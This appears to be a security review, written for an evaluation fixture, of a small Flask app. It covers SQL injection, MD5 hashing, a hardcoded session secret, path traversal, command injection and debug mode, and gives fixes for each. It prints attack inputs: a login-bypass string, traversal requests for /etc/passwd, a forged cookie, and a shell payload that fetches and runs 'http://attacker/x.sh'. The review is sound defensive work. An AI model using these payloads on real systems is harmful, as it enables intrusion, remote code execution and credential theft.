# Security Review: eval/fixtures/review_target_small.py

Scope: security issues only, per task instructions. Style, naming,
performance, and test-coverage concerns are intentionally excluded.

---

## 1. SQL Injection in `login()` — CRITICAL

**Lines:** 23-26 (and the `username` interpolation carries through to line 32)

```python
cur = db.execute(
    f"SELECT id, role FROM users WHERE username = '{username}' "
    f"AND pw_hash = '{pw_hash}'"
)
```

**Why exploitable:** `username` comes directly from `request.form["username"]`
and is spliced into the SQL string with an f-string, with no escaping or
parameterization. A classic authentication-bypass payload works here, e.g.
submitting:

```
username = admin' --
password = anything
```

produces:

```sql
SELECT id, role FROM users WHERE username = 'admin' --' AND pw_hash = '...'
```

which comments out the password check entirely and logs the attacker in as
`admin`. Since the row's `role` is echoed back and used to mint a session
cookie (line 30), this is a full authentication bypass, not just data leakage.
Because SQLite supports stacked/UNION-based injection as well, this also
allows arbitrary data exfiltration (`UNION SELECT` from any table) and, since
`sqlite3.connect` allows multiple statements only via `executescript`, at
minimum full read access to the database via UNION injection.

**Fix:**

```python
cur = db.execute(
    "SELECT id, role FROM users WHERE username = ? AND pw_hash = ?",
    (username, pw_hash),
)
```

---

## 2. Weak password hashing (MD5, unsalted) — HIGH

**Line:** 22

```python
pw_hash = hashlib.md5(password.encode()).hexdigest()
```

**Why exploitable:** MD5 is cryptographically broken and, more importantly
here, unsalted — identical passwords across users produce identical hashes,
and the hash space is small enough to be reversed instantly via rainbow
tables (MD5 hashes of common passwords are widely precomputed). If the
`users.db` file or its `pw_hash` column is ever exposed (backup, the
`/export` endpoint below, a different SQL-injection read, etc.), essentially
all passwords are recoverable within seconds. This is a password-storage
failure, not just a "weak algorithm" nitpick — it directly enables full
account takeover once the hash is read.

**Fix:** use a slow, salted, purpose-built KDF such as `bcrypt`, `scrypt`, or
`argon2`:

```python
import bcrypt

pw_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
...
if bcrypt.checkpw(password.encode(), row["pw_hash"]):
    ...
```

---

## 3. Hardcoded secret used for session/auth material — CRITICAL

**Line:** 10 (used at line 30)

```python
SECRET = "sk-admin-9f8e7d6c5b4a"
...
resp.set_cookie("session", f"{row[0]}:{SECRET}")
```

**Why exploitable:** The secret is a literal string committed to source
control, so anyone with repo access (including this review context) knows
its exact value: `sk-admin-9f8e7d6c5b4a`. Since the "session token" is simply
`f"{user_id}:{SECRET}"` — a fixed, known, unsigned constant — any attacker
who has ever seen the source (or the string, e.g. via a leaked build
artifact, GitHub history, or the same secret reused in error messages/logs
elsewhere) can forge a valid session for **any** user id without ever
authenticating, e.g. by setting a cookie `session=1:sk-admin-9f8e7d6c5b4a` to
impersonate user id 1 (likely an admin). There's no HMAC, no expiry, and no
per-session randomness — knowledge of one constant plus a guessable integer
ID is sufficient to fully impersonate every account.

**Fix:** load secrets from environment/secret manager, and use a proper
signed session mechanism (e.g. Flask's signed sessions or a JWT signed with
the secret, not string concatenation):

```python
import os
app.secret_key = os.environ["APP_SECRET_KEY"]  # never hardcoded, never in VCS

# and use Flask's session (itsdangerous-signed) instead of a hand-rolled cookie:
from flask import session
session["user_id"] = row[0]
session["role"] = row[1]
```

---

## 4. Unsigned, forgeable session cookie without security flags — CRITICAL
   (related to #3 but independently exploitable even if the secret were
   randomly generated)

**Line:** 30

```python
resp.set_cookie("session", f"{row[0]}:{SECRET}")
```

**Why exploitable:** Beyond the hardcoded value, the cookie is set with no
`httponly`, `secure`, or `samesite` attributes, and the "session" is not
cryptographically bound to a specific login (no HMAC/signature over the user
id, no expiration, no random nonce). Even disregarding issue #3:
- Without `HttpOnly`, any XSS elsewhere in the app (or a related app sharing
  the domain) can read `document.cookie` and steal the token.
- Without `Secure`, the cookie is sent over plain HTTP if the app is ever
  reached that way, allowing network-level interception.
- Without `SameSite`, the cookie is attached to cross-site requests, aiding
  CSRF.
- The token format `id:SECRET` is identical for every session for a given
  user and never expires — there is no way to invalidate a single session,
  and if the secret is ever guessed/leaked/brute-forced (it's short — 20
  hex-ish chars derived from an obvious pattern), every account is
  compromised permanently until a code deploy rotates it.

**Fix:** use Flask's built-in signed session cookie (HMAC-signed via
`itsdangerous`) and set proper flags:

```python
resp.set_cookie(
    "session",
    make_signed_token(row[0]),  # HMAC-signed, includes expiry
    httponly=True,
    secure=True,
    samesite="Lax",
)
```

---

## 5. Path traversal / arbitrary file read in `avatar()` — CRITICAL

**Lines:** 35-38

```python
@app.route("/avatar")
def avatar():
    filename = request.args.get("f", "default.png")
    return send_file(os.path.join("avatars", filename))
```

**Why exploitable:** `filename` is attacker-controlled and passed unsanitized
into `os.path.join`. `os.path.join("avatars", "../../etc/passwd")` resolves
outside the `avatars` directory. A request like:

```
GET /avatar?f=../../../../etc/passwd
```

(or, on the same host, `f=../app.py` to read the source and recover the
hardcoded `SECRET`, or `f=../users.db` to exfiltrate the whole user database
including password hashes) serves arbitrary files readable by the process,
via Flask's own `send_file`. This directly chains into issues #2 and #3
(reading `users.db` or the source file recovers the MD5 hashes and the
session-forging secret).

**Fix:** resolve and verify the path stays within the intended directory
(e.g. using `flask.safe_join` or `werkzeug.utils.secure_filename` plus a
real-path containment check):

```python
from werkzeug.utils import secure_filename

@app.route("/avatar")
def avatar():
    filename = secure_filename(request.args.get("f", "default.png"))
    path = os.path.join(AVATAR_DIR, filename)
    if not os.path.realpath(path).startswith(os.path.realpath(AVATAR_DIR) + os.sep):
        abort(404)
    return send_file(path)
```

---

## 6. OS command injection in `export()` — CRITICAL

**Lines:** 41-46

```python
@app.route("/export")
def export():
    table = request.args.get("table", "users")
    fmt = request.args.get("format", "csv")
    os.system(f"sqlite3 {DB} '.mode {fmt}' 'SELECT * FROM {table}' > /tmp/export.{fmt}")
    return send_file(f"/tmp/export.{fmt}")
```

**Why exploitable:** Both `table` and `fmt` are unauthenticated,
attacker-controlled query parameters passed straight into a shell command via
`os.system`. This is a textbook shell-injection sink. Because this endpoint
requires no authentication at all (no session/login check on `/export`), any
unauthenticated network client can run arbitrary shell commands on the
server. Example payload:

```
GET /export?table=users&format=csv'; curl http://attacker/x.sh | sh; echo '
```

or simply:

```
GET /export?format=csv; cat /etc/passwd > /tmp/export.csv;
```

This gives full remote code execution as whatever OS user runs the Flask
process — the most severe issue in the file, and it doesn't even require
prior compromise of the login endpoint.

**Fix:** never shell out with interpolated user input. Use the `sqlite3`
Python module directly and parameterize/whitelist the table and format:

```python
ALLOWED_FORMATS = {"csv", "json"}
ALLOWED_TABLES = {"users", "orders"}  # explicit allow-list

@app.route("/export")
def export():
    table = request.args.get("table", "users")
    fmt = request.args.get("format", "csv")
    if table not in ALLOWED_TABLES or fmt not in ALLOWED_FORMATS:
        abort(400)
    db = get_db()
    rows = db.execute(f"SELECT * FROM {table}").fetchall()  # table from allow-list only
    # serialize `rows` to the requested format in Python, write to a
    # per-request temp file (e.g. tempfile.NamedTemporaryFile), no shell involved
    ...
```

Also note this endpoint appears to have **no authentication/authorization
check at all**, unlike `/login` — even after fixing the injection, it should
require an authenticated admin session before running.

---

## 7. Debug mode enabled and bound to all interfaces — HIGH

**Line:** 50

```python
app.run(host="0.0.0.0", debug=True)
```

**Why exploitable:** Flask's debug mode enables the Werkzeug interactive
debugger, which evaluates arbitrary Python expressions in-browser when an
unhandled exception occurs. If this ever runs in a reachable environment
(and it's bound to `0.0.0.0`, i.e. all interfaces, not just localhost), any
unauthenticated user who can trigger a stack trace (trivial given the
injection bugs above, or even just malformed input) can reach the debugger
endpoint and execute arbitrary code on the host — this is a well-known,
actively exploited RCE vector (Werkzeug debugger PIN is often brute-forceable
or disabled). Combined with `host="0.0.0.0"`, the app is also reachable from
any network interface rather than restricted to loopback/internal networks.

**Fix:**

```python
app.run(host="127.0.0.1", debug=False)
```

and control debug behavior via an environment-gated config for local dev
only, never in the code path that ships to a reachable/production host.

---

## 8. User enumeration via error message — LOW

**Line:** 32

```python
return jsonify({"status": "error", "detail": f"no such user {username}"}), 401
```

**Why exploitable:** The error response distinguishes "no such user" from a
wrong-password case (which returns the same generic failure via the
`if row:` branch, but the message differs based on whether the SQL
query matched). Also note it echoes the raw `username` from the request
back into the JSON response. An attacker can enumerate valid usernames by
observing whether the response text mentions "no such user X" vs. a
generic auth failure, narrowing brute-force/credential-stuffing targets.
(Reflecting user-controlled input in a JSON body is lower risk than reflecting
into HTML, since `jsonify` sets `Content-Type: application/json` and there's
no HTML rendering context evident here, but the enumeration issue stands on
its own.)

**Fix:** return an identical generic message regardless of which check
failed:

```python
return jsonify({"status": "error", "detail": "invalid username or password"}), 401
```

---

## Prioritized Fix Order

1. **#6 — Command injection in `/export`** (unauthenticated RCE; fix first, it's the most severe and easiest to exploit).
2. **#5 — Path traversal in `/avatar`** (unauthenticated arbitrary file read; can be used to steal the secret/DB and escalate everything else).
3. **#1 — SQL injection in `/login`** (unauthenticated auth bypass / data exfiltration).
4. **#3 / #4 — Hardcoded secret + unsigned/unflagged session cookie** (fix together: move to a real secret-management + signed-session mechanism with `HttpOnly`/`Secure`/`SameSite`).
5. **#7 — Disable `debug=True` and stop binding to `0.0.0.0`** (removes a standing RCE surface even after other bugs are patched).
6. **#2 — Replace MD5 with bcrypt/argon2/scrypt for password hashing** (limits blast radius if the DB is ever read).
7. **#8 — Remove username enumeration from the login error message** (lowest severity, cheap fix).

LOADED: none
